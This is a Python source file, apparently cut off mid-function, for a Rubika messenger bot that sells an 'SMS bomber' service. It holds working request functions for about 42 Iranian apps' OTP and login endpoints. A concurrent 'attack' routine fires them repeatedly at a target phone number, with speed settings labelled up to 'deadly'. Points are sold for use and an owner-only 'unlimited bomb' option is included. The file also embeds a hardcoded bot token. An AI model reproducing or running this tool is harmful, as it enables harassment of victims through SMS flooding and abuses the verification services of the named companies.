import asyncio
from os import system as os_system, name as os_name
from re import match, sub
from threading import Thread, Event
import urllib3
from time import sleep, time
from collections import defaultdict
import random
import json
from pathlib import Path
import requests
from datetime import datetime, timedelta
from rubka.asynco import Robot
from rubka.context import Message
from rubka.keypad import ChatKeypadBuilder
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "CCECGG0UASZOEVMLGCLROSINXMADFBIONGNBDRUFOOKTKHOPYBAIQNSXGBJFRODI"
ADMIN_CHAT_ID = "u0KMJvN0672eac9cad2030bcc6ac13cc"
ADMIN_USERNAME = "@ALI_ARMINEH_xLaX"
DATA_FILE = Path("bot_data.json")
LOG_FILE = 'log_v4.txt'

last_operation = {}
stop_events = {}
user_states = defaultdict(dict)

# قیمت‌های خرید امتیاز به تومان
BUY_POINTS_PRICES = {
    10: 20, 20: 40, 30: 60, 40: 80, 50: 100,
    100: 150, 200: 300, 300: 450, 400: 600, 500: 700
}

DEFAULT_SERVICE_STATUS = {
    'divar': True, 'nobatir': True, 'alopeyk_login': True, 'alopeyk_signup': True,
    'shahrefarsh': True, 'snapp_express': True, 'azki': True, 'digikala_jet': True,
    'snapp_drivers': True, 'ostadkar': True, 'miare': True, 'tapsi_drivers': True,
    'tapsi_passenger': True, 'banimode': True, 'taaghche_login': True,
    'taaghche_signup': True, 'mobit': True, 'jabama': True, 'ghabzino': True,
    'komodaa': True, 'barghe_man': True, 'vandar': True, 'pinorest': True,
    'tetherland': True, 'alibaba': True, 'drdr': True, 'drnext': True,
    'classino': True, 'takshopaccessorise': True, 'snap': True, 'tap30': True,
    'torob': True, 'snapfood': True, 'sheypoor': True, 'basalam': True,
    'filmnet': True, 'sTrip': True, 'digikala': True, 'flightio': True,
    'gap': True, 'tbourse': True, 'itoll': True
}

_data_cache = None
_data_cache_time = 0
CACHE_TTL = 2

def load_data():
    global _data_cache, _data_cache_time
    current_time = time()
    
    if _data_cache is not None and (current_time - _data_cache_time) < CACHE_TTL:
        return _data_cache
    
    if not DATA_FILE.exists():
        initial_data = {
            "users": {},
            "banned_users": [],
            "personal_blacklist": [],
            "owner_blacklist": [],
            "bot_settings": {"cooldown_seconds": 60},
            "service_status": DEFAULT_SERVICE_STATUS,
            "service_stats": {name: {'success': 0, 'failure': 0} for name in DEFAULT_SERVICE_STATUS},
            "referrals": {},
            "points": {},
            "pending_referral": {},
            "daily_rewards": {},
            "free_bombs": {},
            "help_link": "https://rubika.ir/join/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ",
            "security_info": "ربات با پروتکل HTTPS و احراز هویت دو مرحله‌ای کار می‌کند."
        }
        save_data(initial_data)
        _data_cache = initial_data
        _data_cache_time = current_time
        return initial_data

    try:
        with DATA_FILE.open('r', encoding='utf-8') as f:
            data = json.load(f)
        data.setdefault("users", {})
        data.setdefault("banned_users", [])
        data.setdefault("personal_blacklist", [])
        data.setdefault("owner_blacklist", [])
        data.setdefault("bot_settings", {"cooldown_seconds": 60})
        data.setdefault("referrals", {})
        data.setdefault("points", {})
        data.setdefault("pending_referral", {})
        data.setdefault("daily_rewards", {})
        data.setdefault("free_bombs", {})
        data.setdefault("help_link", "https://rubika.ir/join/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ")
        data.setdefault("security_info", "ربات با پروتکل HTTPS و احراز هویت دو مرحله‌ای کار می‌کند.")
        
        loaded_services = data.get("service_status", {})
        updated_services = DEFAULT_SERVICE_STATUS.copy()
        updated_services.update(loaded_services)
        data["service_status"] = updated_services
        
        data.setdefault("service_stats", {name: {'success': 0, 'failure': 0} for name in DEFAULT_SERVICE_STATUS})
        for service in DEFAULT_SERVICE_STATUS:
            if service not in data["service_stats"]:
                data["service_stats"][service] = {'success': 0, 'failure': 0}
        
        _data_cache = data
        _data_cache_time = current_time
        return data
    except (json.JSONDecodeError, Exception) as e:
        print(f"[خطا] خواندن فایل {DATA_FILE} ناموفق بود: {e}")
        return load_data()

def save_data(data):
    global _data_cache, _data_cache_time
    try:
        with DATA_FILE.open('w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        _data_cache = data
        _data_cache_time = time()
    except Exception as e:
        print(f"[خطا] ذخیره داده‌ها در {DATA_FILE} ناموفق بود: {e}")

def invalidate_cache():
    global _data_cache, _data_cache_time
    _data_cache = None
    _data_cache_time = 0

def generate_referral_code(user_id):
    hash_obj = hashlib.md5(f"{user_id}{time()}".encode())
    return hash_obj.hexdigest()[:8].upper()

def get_user_referral_link(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data["referrals"]:
        code = generate_referral_code(user_id)
        data["referrals"][user_id_str] = {
            "code": code,
            "referred_by": None,
            "referred_users": []
        }
        save_data(data)
    else:
        code = data["referrals"][user_id_str]["code"]
    return f"https://rubika.ir/join?ref={code}"

def add_points(user_id, points):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str not in data["points"]:
        data["points"][user_id_str] = 0
    data["points"][user_id_str] += points
    save_data(data)
    invalidate_cache()
    return data["points"][user_id_str]

def get_user_points(user_id):
    data = load_data()
    return data["points"].get(str(user_id), 0)

def process_referral(user_id, ref_code, send_notification=True):
    data = load_data()
    user_id_str = str(user_id)
    
    referrer_id = None
    for uid, ref_data in data["referrals"].items():
        if ref_data["code"] == ref_code:
            referrer_id = uid
            break
    
    if referrer_id and referrer_id != user_id_str:
        if user_id_str not in data["referrals"]:
            data["referrals"][user_id_str] = {
                "code": generate_referral_code(user_id),
                "referred_by": referrer_id,
                "referred_users": []
            }
        
        if user_id_str not in data["referrals"][referrer_id]["referred_users"]:
            data["referrals"][referrer_id]["referred_users"].append(user_id_str)
        
        new_points = add_points(referrer_id, 1)
        save_data(data)
        invalidate_cache()
        
        if send_notification:
            try:
                async def send_referral_notification():
                    bot_instance = Robot(token=BOT_TOKEN)
                    await bot_instance.send_message(
                        referrer_id,
                        f"🎉 یک کاربر جدید با کد دعوت شما وارد شد!\n\n"
                        f"⭐ 1 امتیاز به حساب شما اضافه شد.\n"
                        f"امتیاز فعلی شما: {new_points}"
                    )
                asyncio.run_coroutine_threadsafe(send_referral_notification(), main_loop)
            except Exception as e:
                print(f"خطا در ارسال پیام به دعوت‌کننده: {e}")
        
        return True, referrer_id
    
    return False, None

def get_referral_stats(user_id):
    data = load_data()
    user_id_str = str(user_id)
    if user_id_str in data["referrals"]:
        ref_data = data["referrals"][user_id_str]
        return {
            "code": ref_data["code"],
            "referred_by": ref_data["referred_by"],
            "referred_count": len(ref_data["referred_users"]),
            "points": get_user_points(user_id)
        }
    return None

def check_daily_reward(user_id):
    data = load_data()
    user_id_str = str(user_id)
    last_reward = data['daily_rewards'].get(user_id_str)
    
    if last_reward:
        last_time = datetime.fromisoformat(last_reward)
        if datetime.now() - last_time < timedelta(hours=24):
            return False, "⏳ هنوز 24 ساعت نگذشته است!"
    
    add_points(user_id, 3)
    data['daily_rewards'][user_id_str] = datetime.now().isoformat()
    save_data(data)
    invalidate_cache()
    return True, "✅ 3 امتیاز دریافت کردید!"

def check_free_bomb(user_id):
    data = load_data()
    user_id_str = str(user_id)
    last_bomb = data['free_bombs'].get(user_id_str)
    
    if last_bomb:
        last_time = datetime.fromisoformat(last_bomb)
        if datetime.now() - last_time < timedelta(hours=24):
            return False, "⏳ هنوز 24 ساعت نگذشته است!"
    
    data['free_bombs'][user_id_str] = datetime.now().isoformat()
    save_data(data)
    invalidate_cache()
    return True, "✅ 50 اسمس بمبر رایگان فعال شد!"

def normalize_phone(phone: str):
    cleaned_phone = sub(r'[^\d+]', '', phone)
    if match(r"^(?:\+98|98|0)?(9\d{9})$", cleaned_phone):
        return sub(r"^(?:\+98|98|0)?(9\d{9})$", r"+98\1", cleaned_phone)
    return None

def get_progress_bar(progress_percent):
    bar_length = 10
    filled_count = int(bar_length * progress_percent // 100)
    bar = "🟩" * filled_count + "⬛" * (bar_length - filled_count)
    emojis = ["🌑", "🌒", "🌓", "🌔", "🌕", "🌖", "🌗", "🌘"]
    emoji_index = int((progress_percent / 100) * (len(emojis) - 1))
    return f"[{bar}] {emojis[emoji_index]}"

def curl_sms(url: str, body: str, headers: dict = None, is_json=False):
    try:
        if is_json:
            response = requests.post(url, json=json.loads(body), headers=headers, verify=False, timeout=5)
        else:
            response = requests.post(url, data=body, headers=headers, verify=False, timeout=5)
        return 200 <= response.status_code < 300
    except Exception:
        return False

def update_service_stats(service_name, success):
    data = load_data()
    key = 'success' if success else 'failure'
    if service_name in data['service_stats']:
        data['service_stats'][service_name][key] += 1
        save_data(data)

def log_status(service_name, phone, success):
    print(f"{'✅' if success else '❌'} {service_name}: {'ارسال شد به' if success else 'خطا در ارسال به'} {phone}")
    update_service_stats(service_name, success)

# ==================== سرویس‌های اسمس بمبر ====================

def divar(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.divar.ir/v5/auth/authenticate', json.dumps({'phone': p}), is_json=True)
    log_status("divar", phone, success)
    return success

def nobatir(phone):
    p = phone.replace('+98', '0')
    body = f"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n{p}\r\n------WebKitFormBoundary5wscOwxMqnICoiZY--\r\n"
    headers = {'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary5wscOwxMqnICoiZY'}
    success = curl_sms('https://nobat.ir/api/public/patient/login/phone', body, headers)
    log_status("nobatir", phone, success)
    return success

def alopeyk_login(phone):
    p = phone.replace('+98', '')
    body = json.dumps({"type": "CUSTOMER", "phone": p})
    success = curl_sms('https://api.alopeyk.com/api/v2/login?platform=pwa', body, {'content-type': 'application/json'}, is_json=True)
    log_status("alopeyk_login", phone, success)
    return success

def alopeyk_signup(phone):
    p = phone.replace('+98', '0')
    body = json.dumps({"type": "CUSTOMER", "firstname": "تست", "lastname": "تست", "phone": p})
    success = curl_sms('https://api.alopeyk.com/api/v2/register-customer?platform=pwa', body, {'content-type': 'application/json'}, is_json=True)
    log_status("alopeyk_signup", phone, success)
    return success

def shahrefarsh(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://shahrfarsh.com/Account/Login', f'phoneNumber={p}')
    log_status("shahrefarsh", phone, success)
    return success

def snapp_express(phone):
    p = phone.replace('+98', '0')
    body = f'cellphone={p}&captcha=&optionalLoginToken=true&local='
    success = curl_sms('https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA', body)
    log_status("snapp_express", phone, success)
    return success

def azki(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', json.dumps({"phoneNumber": p}), {'content-type': 'application/json'}, is_json=True)
    log_status("azki", phone, success)
    return success

def digikala_jet(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.digikalajet.ir/user/login-register/', json.dumps({'phone': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("digikala_jet", phone, success)
    return success

def snapp_drivers(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://digitalsignup.snapp.ir/ds3/api/v3/otp', json.dumps({'cellphone': p}), is_json=True)
    log_status("snapp_drivers", phone, success)
    return success

def ostadkar(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.ostadkr.com/login', json.dumps({'mobile': p}), is_json=True)
    log_status("ostadkar", phone, success)
    return success

def miare(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://www.miare.ir/api/otp/driver/request/', json.dumps({'phone_number': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("miare", phone, success)
    return success

def tapsi_drivers(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.tapsi.ir/api/v2.2/user', json.dumps({'credential': {'phoneNumber': p, 'role': 'DRIVER'}, 'otpOption': 'SMS'}), {'content-type': 'application/json'}, is_json=True)
    log_status("tapsi_drivers", phone, success)
    return success

def tapsi_passenger(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.tapsi.ir/api/v2.2/user', json.dumps({'credential': {'phoneNumber': p, 'role': 'PASSENGER'}, 'otpOption': 'SMS'}), {'content-type': 'application/json'}, is_json=True)
    log_status("tapsi_passenger", phone, success)
    return success

def banimode(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://mobapi.banimode.com/api/v2/auth/request', json.dumps({'phone': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("banimode", phone, success)
    return success

def taaghche_login(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://gw.taaghche.com/v4/site/auth/login', json.dumps({'contact': p, 'forceOtp': False}), {'content-type': 'application/json'}, is_json=True)
    log_status("taaghche_login", phone, success)
    return success

def taaghche_signup(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://gw.taaghche.com/v4/site/auth/signup', json.dumps({'contact': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("taaghche_signup", phone, success)
    return success

def mobit(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.mobit.ir/api/web/v8/register/register', json.dumps({'number': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("mobit", phone, success)
    return success

def jabama(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://taraazws.jabama.com/api/v4/account/send-code', json.dumps({'mobile': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("jabama", phone, success)
    return success

def ghabzino(phone):
    p = phone.replace('+98', '0')
    body = json.dumps({"Parameters": {"MobileNumber": p}})
    success = curl_sms('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', body, {'content-type': 'application/json'}, is_json=True)
    log_status("ghabzino", phone, success)
    return success

def komodaa(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.komodaa.com/api/v2.6/loginRC/request', json.dumps({'phone_number': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("komodaa", phone, success)
    return success

def barghe_man(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://uiapi2.saapa.ir/api/otp/sendCode', json.dumps({'mobile': p}), is_json=True)
    log_status("barghe_man", phone, success)
    return success

def vandar(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.vandar.io/account/v1/check/mobile', json.dumps({'mobile': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("vandar", phone, success)
    return success

def pinorest(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://api.pinorest.com/frontend/auth/login/mobile', json.dumps({'mobile': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("pinorest", phone, success)
    return success

def tetherland(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://service.tetherland.com/api/v5/login-register', json.dumps({'mobile': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("tetherland", phone, success)
    return success

def alibaba(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://ws.alibaba.ir/api/v3/account/mobile/otp', json.dumps({'phoneNumber': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("alibaba", phone, success)
    return success

def drdr(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://drdr.ir/api/v3/auth/login/mobile/init', json.dumps({'mobile': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("drdr", phone, success)
    return success

def drnext(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token', json.dumps({'mobile': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("drnext", phone, success)
    return success

def classino(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://student.classino.com/otp/v1/api/login', json.dumps({'mobile': p}), {'Content-Type': 'application/json'}, is_json=True)
    log_status("classino", phone, success)
    return success

def takshopaccessorise(phone):
    p = phone.replace('+98', '0')
    success = curl_sms('https://takshopaccessorise.ir/api/v1/sessions/login_request', json.dumps({'mobile_phone': p}), {'content-type': 'application/json'}, is_json=True)
    log_status("takshopaccessorise", phone, success)
    return success

def snap(phone):
    try:
        requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json={"cellphone": phone}, timeout=5, verify=False)
        log_status("snap", phone, True)
        return True
    except Exception:
        log_status("snap", phone, False)
        return False

def tap30(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post("https://tap33.me/api/v2/user", json={"credential": {"phoneNumber": p, "role": "PASSENGER"}}, timeout=5, verify=False)
        log_status("tap30", phone, True)
        return True
    except Exception:
        log_status("tap30", phone, False)
        return False

def torob(phone):
    try:
        p = '0' + phone.split('+98')[1]
        requests.get(f"https://api.torob.com/a/phone/send-pin/?phone_number={p}", timeout=5, verify=False)
        log_status("torob", phone, True)
        return True
    except Exception:
        log_status("torob", phone, False)
        return False

def snapfood(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', json={"cellphone": p}, timeout=5, verify=False)
        log_status("snapfood", phone, True)
        return True
    except Exception:
        log_status("snapfood", phone, False)
        return False

def digikala(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post("https://api.digikala.com/v1/user/otp/", json={"username": p}, timeout=5, verify=False)
        log_status("digikala", phone, True)
        return True
    except Exception:
        log_status("digikala", phone, False)
        return False

def flightio(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post("https://flightio.com/api/v2.2/customer/authentication/otp/send", json={"mobile": p}, timeout=5, verify=False)
        log_status("flightio", phone, True)
        return True
    except Exception:
        log_status("flightio", phone, False)
        return False

def sheypoor(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post('https://www.sheypoor.com/auth', json={"username": p}, timeout=5, verify=False)
        log_status("sheypoor", phone, True)
        return True
    except Exception:
        log_status("sheypoor", phone, False)
        return False

def basalam(phone):
    try:
        p = '0' + phone.split('+98')[1]
        data = {"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }", "variables": {"mobile": p}}
        requests.post('https://api.basalam.com/user', json=data, timeout=5, verify=False)
        log_status("basalam", phone, True)
        return True
    except Exception:
        log_status("basalam", phone, False)
        return False

def sTrip(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post('https://www.snapptrip.com/register', json={"mobile_phone":p}, timeout=5, verify=False)
        log_status("sTrip", phone, True)
        return True
    except Exception:
        log_status("sTrip", phone, False)
        return False
        
def gap(phone):
    try:
        requests.get(f"https://core.gap.im/v1/user/add.json?phone={phone.split('+')[1]}", timeout=5, verify=False)
        log_status("gap", phone, True)
        return True
    except Exception:
        log_status("gap", phone, False)
        return False

def tbourse(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post("https://api.irantbours.com:443/api/v1/access/join/mobile/request", json={"mobile": p}, timeout=5, verify=False)
        log_status("tbourse", phone, True)
        return True
    except Exception:
        log_status("tbourse", phone, False)
        return False

def itoll(phone):
    try:
        p = "0" + phone.split("+98")[1]
        requests.post("https://app.itoll.com/api/v1/auth/login", json={"mobile": p}, timeout=5, verify=False)
        log_status("itoll", phone, True)
        return True
    except Exception:
        log_status("itoll", phone, False)
        return False

def filmnet(phone):
    try:
        requests.get(f"https://api-v2.filmnet.ir/access-token/users/{phone.replace('+98', '0')}/otp", timeout=5, verify=False)
        log_status("filmnet", phone, True)
        return True
    except Exception:
        log_status("filmnet", phone, False)
        return False

ALL_SERVICES_MAP = {
    'divar': divar, 'nobatir': nobatir, 'alopeyk_login': alopeyk_login, 'alopeyk_signup': alopeyk_signup,
    'shahrefarsh': shahrefarsh, 'snapp_express': snapp_express, 'azki': azki, 'digikala_jet': digikala_jet,
    'snapp_drivers': snapp_drivers, 'ostadkar': ostadkar, 'miare': miare, 'tapsi_drivers': tapsi_drivers,
    'tapsi_passenger': tapsi_passenger, 'banimode': banimode, 'taaghche_login': taaghche_login,
    'taaghche_signup': taaghche_signup, 'mobit': mobit, 'jabama': jabama, 'ghabzino': ghabzino,
    'komodaa': komodaa, 'barghe_man': barghe_man, 'vandar': vandar, 'pinorest': pinorest,
    'tetherland': tetherland, 'alibaba': alibaba, 'drdr': drdr, 'drnext': drnext,
    'classino': classino, 'takshopaccessorise': takshopaccessorise, 'snap': snap, 'tap30': tap30,
    'torob': torob, 'snapfood': snapfood, 'sheypoor': sheypoor, 'basalam': basalam,
    'filmnet': filmnet, 'sTrip': sTrip, 'digikala': digikala, 'flightio': flightio,
    'gap': gap, 'tbourse': tbourse, 'itoll': itoll
}

def get_active_services():
    data = load_data()
    service_status = data.get("service_status", {})
    return {name: func for name, func in ALL_SERVICES_MAP.items() if service_status.get(name, False)}

bot = Robot(token=BOT_TOKEN)
main_loop = asyncio.new_event_loop()
asyncio.set_event_loop(main_loop)

# ==================== کیپدها ====================

def get_main_menu_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="start_bomb", text="💣 شروع عملیات جدید"))
    builder.row(builder.button(id="free_bomb", text="🎁 اسمس بمبر رایگان"))
    builder.row(builder.button(id="my_stats", text="📊 آمار من"), builder.button(id="my_points", text="⭐ امتیازات من"))
    builder.row(builder.button(id="daily_reward", text="🎁 دریافت پاداش روزانه"))
    builder.row(builder.button(id="referral", text="🔗 لینک ارجاع"), builder.button(id="enter_referral", text="🔑 وارد کردن کد دعوت"))
    builder.row(builder.button(id="buy_points", text="💰 خرید امتیاز"))
    builder.row(builder.button(id="blacklist_self", text="🛡 لیست سیاه شخصی"))
    builder.row(builder.button(id="channel", text="📢 کانال ما"), builder.button(id="help", text="❓ راهنما"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_referral_code_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="skip_referral", text="⏭️ رد کردن"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت به منوی اصلی"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_cancel_keypad(text="🚫 لغو عملیات"):
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="cancel_op", text=text))
    return builder.build(resize_keyboard=True)

def get_back_keypad(text="↪️ بازگشت به منوی اصلی"):
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="cancel", text=text))
    return builder.build(resize_keyboard=True)

def get_attack_type_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="attack_all", text="💥 حمله با تمام سرویس‌ها"))
    builder.row(builder.button(id="attack_select", text="🎯 حمله با سرویس‌های منتخب"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_rounds_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="rounds_1", text="۱ دور"), builder.button(id="rounds_2", text="۲ دور"), builder.button(id="rounds_3", text="۳ دور"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_intensity_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="delay_0.1", text="⚡️⚡️ خیلی سریع"), builder.button(id="delay_0.05", text="🔥🔥 فوق سریع"), builder.button(id="delay_0.01", text="💀💀 مرگبار"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)
    
def get_confirmation_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="confirm_attack", text="✅ تایید و شروع حمله"))
    builder.row(builder.button(id="cancel", text="❌ لغو و بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_service_selection_keypad(chat_id):
    builder = ChatKeypadBuilder()
    state = user_states[chat_id]
    selected_services = state.get('selected_services', [])
    active_services = sorted(get_active_services().keys())
    
    for i in range(0, len(active_services), 2):
        row = []
        name1 = active_services[i]
        status1 = "✅" if name1 in selected_services else "☑️"
        row.append(builder.button(id=f"select_service_{name1}", text=f"{status1} {name1.title()}"))
        if i + 1 < len(active_services):
            name2 = active_services[i+1]
            status2 = "✅" if name2 in selected_services else "☑️"
            row.append(builder.button(id=f"select_service_{name2}", text=f"{status2} {name2.title()}"))
        builder.row(*row)
    
    builder.row(builder.button(id="confirm_service_selection", text="▶️ ثبت انتخاب و ادامه"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_admin_panel_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="admin_stats", text="📊 آمار کلی"))
    builder.row(builder.button(id="admin_users", text="👥 مدیریت کاربران"))
    builder.row(builder.button(id="admin_add_points", text="⭐ افزودن امتیاز"))
    builder.row(builder.button(id="admin_owner_panel", text="👑 پنل مالک"))
    builder.row(builder.button(id="admin_blacklist", text="🛡 لیست سیاه مالک"))
    builder.row(builder.button(id="admin_security", text="🔒 امنیت و وب‌سرویس"))
    builder.row(builder.button(id="cancel", text="↪️ خروج"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_admin_users_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="admin_user_stats", text="📊 آمار کاربران"))
    builder.row(builder.button(id="admin_active_users", text="🟢 کاربران فعال"))
    builder.row(builder.button(id="admin_inactive_users", text="🔴 کاربران غیرفعال"))
    builder.row(builder.button(id="admin_banned_users_list", text="🚫 کاربران مسدود"))
    builder.row(builder.button(id="admin_ban_user", text="🚫 مسدود کاربر"))
    builder.row(builder.button(id="admin_unban_user", text="✅ رفع مسدودیت"))
    builder.row(builder.button(id="back_to_admin", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_buy_points_keypad():
    builder = ChatKeypadBuilder()
    builder.row(
        builder.button(id="buy_10", text="10⭐ = 20تومان"),
        builder.button(id="buy_20", text="20⭐ = 40تومان"),
        builder.button(id="buy_30", text="30⭐ = 60تومان")
    )
    builder.row(
        builder.button(id="buy_40", text="40⭐ = 80تومان"),
        builder.button(id="buy_50", text="50⭐ = 100تومان")
    )
    builder.row(
        builder.button(id="buy_100", text="100⭐ = 150تومان"),
        builder.button(id="buy_200", text="200⭐ = 300تومان"),
        builder.button(id="buy_300", text="300⭐ = 450تومان")
    )
    builder.row(
        builder.button(id="buy_400", text="400⭐ = 600تومان"),
        builder.button(id="buy_500", text="500⭐+100⭐ = 700تومان")
    )
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_owner_panel_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="owner_blacklist_add", text="➕ افزودن به لیست سیاه"))
    builder.row(builder.button(id="owner_blacklist_remove", text="➖ حذف از لیست سیاه"))
    builder.row(builder.button(id="owner_blacklist_list", text="📋 لیست سیاه"))
    builder.row(builder.button(id="owner_unlimited_bomb", text="💣 بمب نامحدود"))
    builder.row(builder.button(id="back_to_admin", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

def get_referral_keypad():
    builder = ChatKeypadBuilder()
    builder.row(builder.button(id="referral_stats", text="📊 آمار ارجاع"), builder.button(id="buy_points", text="💰 خرید امتیاز"))
    builder.row(builder.button(id="enter_referral", text="🔑 وارد کردن کد دعوت"))
    builder.row(builder.button(id="cancel", text="↪️ بازگشت"))
    return builder.build(resize_keyboard=True, on_time_keyboard=True)

# ==================== تابع عملیات بمب‌گذاری ====================

def bombing_run_with_progress(bot_loop, bot_instance: Robot, chat_id, message_id, phone, delay, rounds, stop_event, selected_services_map):
    total_successful_requests = 0
    total_failed_requests = 0
    last_update_text = ""
    
    if chat_id not in last_operation:
        last_operation[chat_id] = {}
    last_operation[chat_id][phone] = time()

    for round_num in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        services_to_run = list(selected_services_map.items())
        random.shuffle(services_to_run)
        total_services_in_round = len(services_to_run)
        
        successful_in_round = []
        failed_in_round = []

        # استفاده از ThreadPoolExecutor برای ارسال همزمان
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for service_name, service_func in services_to_run:
                if stop_event.is_set():
                    break
                future = executor.submit(service_func, phone)
                futures.append((future, service_name))
            
            completed = 0
            for future, service_name in futures:
                if stop_event.is_set():
                    break
                
                try:
                    result = future.result(timeout=6)
                    if result:
                        total_successful_requests += 1
                        successful_in_round.append(service_name.title())
                    else:
                        total_failed_requests += 1
                        failed_in_round.append(service_name.title())
                except:
                    total_failed_requests += 1
                    failed_in_round.append(service_name.title())
                
                completed += 1
                progress_percent = int((completed / total_services_in_round) * 100)
                
                successful_text = f"✅ موفق ({len(successful_in_round)}): " + ", ".join(successful_in_round) if successful_in_round else ""
                failed_text = f"\n❌ ناموفق ({len(failed_in_round)}): " + ", ".join(failed_in_round) if failed_in_round else ""

                new_text = (
                    f"🎯 در حال اجرای عملیات...\n\n"
                    f"📱 شماره هدف: `{phone}`\n"
                    f"🔄 دور: {round_num} / {rounds}\n\n"
                    f"{get_progress_bar(progress_percent)} {progress_percent}%\n"
                    f"🔩 سرویس فعلی: {service_name.title()}\n\n"
                    f"--- نتایج این دور ---\n"
                    f"{successful_text}{failed_text}"
                )
                
                if new_text != last_update_text:
                    try:
                        future_msg = asyncio.run_coroutine_threadsafe(
                            bot_instance.edit_message_text(chat_id, message_id, new_text),
                            bot_loop
                        )
                        future_msg.result(timeout=5)
                        last_update_text = new_text
                    except Exception as e:
                        print(f"خطا در ویرایش پیام: {e}")
                
                sleep(delay)

    data = load_data()
    user_data = data['users'].get(str(chat_id), {})
    user_data['attack_count'] = user_data.get('attack_count', 0) + 1
    user_data['total_sms_sent'] = user_data.get('total_sms_sent', 0) + total_successful_requests
    data['users'][str(chat_id)] = user_data
    save_data(data)

    final_text = (
        f"✅ عملیات با موفقیت به پایان رسید\n\n"
        f"📱 شماره هدف: `{phone}`\n"
        f"🔄 دورهای انجام شده: {rounds}\n\n"
